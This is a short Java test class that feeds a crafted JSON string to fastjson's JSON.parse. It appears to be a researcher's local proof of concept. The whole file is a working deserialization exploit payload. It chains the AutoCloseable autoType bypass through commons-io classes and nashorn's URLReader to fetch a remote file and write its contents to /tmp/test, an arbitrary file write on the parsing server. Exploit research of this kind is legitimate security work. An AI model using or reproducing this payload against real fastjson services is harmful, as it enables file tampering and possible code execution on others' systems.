package com.example.servletdemo.fastjsontest;

import com.alibaba.fastjson.JSON;

/**
 * @author : Walker
 * @date : Created in 2022/5/12 4:02 PM
 * @description:
 */
public class test2 {
    public static void main(String[] args) {
        String x = "{\n" +
                "  \"abc\":{\"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "    \"delegate\":{\n" +
                "      \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "      \"reader\": {\"@type\": \"org.apache.commons.io.input.TeeReader\",\n" +
                "        \"input\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "          \"url\": \"http://127.0.0.1:8082/2.txt\"\n" +
                "        },\n" +
                "        \"branch\": {\"@type\":\"com.alibaba.fastjson.serializer.SerializeWriter\",\n" +
                "          \"writer\":{ \"@type\": \"java.lang.AutoCloseable\",\n" +
                "                     \"@type\":\"org.apache.commons.io.output.XmlStreamWriter\",\n" +
                "                     \"file\":\"/tmp/test\",\n" +
                "                     \"defaultEncoding\":\"UTF-8\"\n" +
                "                    },\n" +
                "          \"initialSize\":100000\n" +
                "        },\n" +
                "        \"closeBranch\":false\n" +
                "      },\n" +
                "      \"charsetName\": \"UTF-8\",\n" +
                "      \"bufferSize\": 8193\n" +
                "    },\n" +
                "    \"boms\": [\n" +
                "      {\n" +
                "        \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "        \"charsetName\": \"UTF-8\",\n" +
                "        \"bytes\": [98,98]\n" +
                "      }\n" +
                "    ]\n" +
                "  },\n" +
                "  \"address\" : {\"$ref\":\"$.abc.BOM\"}\n" +
                "}";
        JSON.parse(x);
    }
}
